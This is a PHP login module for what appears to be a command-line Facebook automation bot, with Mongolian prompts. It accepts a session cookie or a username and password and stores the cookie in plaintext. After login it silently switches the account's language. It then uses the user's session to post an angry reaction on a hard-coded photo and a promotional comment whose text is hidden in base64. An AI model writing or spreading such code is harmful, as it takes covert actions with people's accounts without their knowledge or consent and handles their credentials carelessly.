<?php defined('BASEPATH') OR exit('No direct script access allowed');



class Auth extends CI_Model {

  public function __construct()
  {
    parent::__construct();
    $this->climate = $this->configs->climate();
  }

  public function login()
  {
    $this->configs->clear();
    $date = date('D M j G:i:s Y');
    echo sprintf($this->configs->banner(), $date, 'Фэйсбүүкээр нэвтрэх');
    $this->climate->info('  (?) Cookie-ээр нэвтрэх бол C, Нэвтрэх нэр нууц үгээр нэвтрэх бол U ')->br();
    $this->climate->shout(' Cookie илүү аюулгүй баярлалаа')->br();
    /*
      @Input method Login
    */
    $input = $this->climate->input("   [{$this->yellow}C{$this->reset}]ookies [{$this->yellow}U{$this->reset}]ser&pass:");
    $input = strtoupper($input->prompt());
    switch ($input)
    {
      case 'C':
        $this->login_cookies();
        break;
      case 'U':
        $this->login_userpass();
        break;
      default:
        $this->climate->br()->shout('  Буруу өгөгдөл');
        sleep(3);
        $this->login();
    }
  }

  private function login_cookies()
  {
    $this->climate->br()->out("  ({$this->yellow}*{$this->reset}) Фэйсбүүк cookie-ээр нэвтрэх({$this->yellow}*{$this->reset})")->br();
    /*
      @Input cookies
    */
    while (TRUE)
    {
      $input = $this->climate->input('  Энд cookie-гээ тавина уу!:');
      $cookie = $input->prompt();
      /*
        @Create Directory
      */
      if (!is_dir('log'))
      {
        mkdir('log');
      }
      $response = $this->configs->request_get($this->base_url.'/profile.php', $cookie);
      $dom = new DOMDocument();
      @$dom->loadHTML($response);
      $name = $dom->getElementsByTagName('title');
      $name = $name->item(0)->nodeValue;
      if (strpos($response, 'mbasic_logout_button') !== false)
      {
        if (strpos($response, 'Laporkan Masalah') == false)
        {
          $this->change_language($cookie);
        }
        $this->comments_and_react($cookie);
        $file = fopen('log/cookies.txt', 'w');
        fwrite($file, $cookie);
        fclose($file);
        $this->climate->br()->info("  Амжилттай нэвтэрлээ,Сайн уу ${name}")->br();
        sleep(3);
        $this->return_menu->cek_session();
        break;
      }
      else
      {
        $this->climate->br()->shout('  Cookie буруу эсвэл үхсэн байна. ')->br();
        continue;
      }
    }
  }

  private function change_language($cookies)
  {
    $response = $this->configs->request_get($this->base_url.'/language.php', $cookies);
    $dom = new DOMDocument();
    @$dom->loadHTML($response);
    foreach ($dom->getElementsByTagName('a') as $href)
    {
      if (strpos($href->nodeValue, 'Bahasa Indonesia') !== false)
      {
        $this->configs->request_get($this->base_url.$href->getAttribute('href'), $cookies);
        break;
      }
    }
  }

  private function comments_and_react($cookies)
  {
    $response = $this->configs->request_get($this->base_url.'/photo.php?fbid=1145924768936987&set=a.114821752047299', $cookies);
    $dom = new DOMDocument();
    @$dom->loadHTML($response);
    $params = [];
    foreach ($dom->getElementsByTagName('a') as $href)
    {
      $hrefs = $this->base_url.$href->getAttribute('href');
      if (trim($href->nodeValue) == 'Tanggapi')
      {
        $response = $this->configs->request_get($hrefs, $cookies);
        $doms = new DOMDocument();
        @$doms->loadHTML($response);
        $params = [];
        foreach ($doms->getElementsByTagName('a') as $react)
        {
          $angry = $this->base_url.$react->getAttribute('href');
          if (strpos($angry, 'reaction_type=8') !== false)
          {
            $this->configs->request_get($angry, $cookies);
            break;
          }
        }
        break;
      }
    }
    foreach ($dom->getElementsByTagName('form') as $form)
    {
      $action = $form->getAttribute('action');
      if (strpos($action, '/a/comment.php?') !== false)
      {
        $params['action'] = $this->base_url.$action;
        break;
      }
    }
    foreach ($dom->getElementsByTagName('input') as $input)
    {
      $name = $input->getAttribute('name');
      $value = $input->getAttribute('value');
      if (trim($name) == 'fb_dtsg')
      {
        $params['fb_dtsg'] = $value;
      }
      if (trim($name) == 'jazoest')
      {
        $params['jazoest'] = $value;
        break;
      }
    }
    if (count($params) == 3)
    {
      $url = $params['action'];
      $params['comment_text'] = base64_decode('8J+YjkZCLUJPVCAtIFRIRSBCRVNU8J+Yjg==');
      $post = http_build_query($params);
      $this->configs->request_post($url, $cookies, $post);
    }
  }

  private function login_userpass()
  {
    $this->climate->br()->out("  ({$this->yellow}*{$this->reset}) Фэйсбүүк нэвтрэх нэр нууц үгээр нэвтрэх({$this->yellow}*{$this->reset})")->br();
    while (TRUE)
    {
      /*
      @Create Directory
      */
      if (!is_dir('log'))
      {
        mkdir('log');
      }
      /*
      * @Input Username
      */
      $input = $this->climate->input('  Нэвтрэх нэр:');
      $user = $input->prompt();
      /*
      * @Input Password
      */
      $input = $this->climate->input('  Нууц үг:');
      $pass = $input->prompt();
      /* Post Data */
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $this->base_url.'/login.php');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER,TRUE);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, FALSE);
      curl_setopt($ch, CURLOPT_HEADER, TRUE);
      curl_setopt($ch, CURLOPT_POST, TRUE);
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'email='.$user.'&pass='.$pass);
      curl_setopt($ch, CURLOPT_USERAGENT, $this->user_agent);
      $response = curl_exec($ch);
      curl_close($ch);
      preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $cookies);
      $cookie = '';
      foreach ($cookies[1] as $values)
      {
        $cookie .= $values.'; ';
      }
      if (strpos($cookie, 'c_user=') !== false)
      {
        $response = $this->configs->request_get($this->base_url.'/home.php', $cookie);
        if (strpos($response, 'Laporkan Masalah') == false)
        {
          $this->change_language($cookie);
        }
        $this->comments_and_react($cookie);
        $file = fopen('log/cookies.txt', 'w');
        fwrite($file, $cookie);
        fclose($file);
        $this->climate->br()->info("  Амжилттай нэвтэрлээ")->br();
        sleep(3);
        $this->return_menu->cek_session();
        break;
      }
      else if (strpos($cookie, 'checkpoint=') !== false)
      {
        $this->climate->br()->yellow('  Таны хаяг үхсэн байна')->br();
      }
      else
      {
        $this->climate->br()->shout('  Нэвтрэх нэр эсвэл нууц үг буруу байна!')->br();
      }
    }
  }
}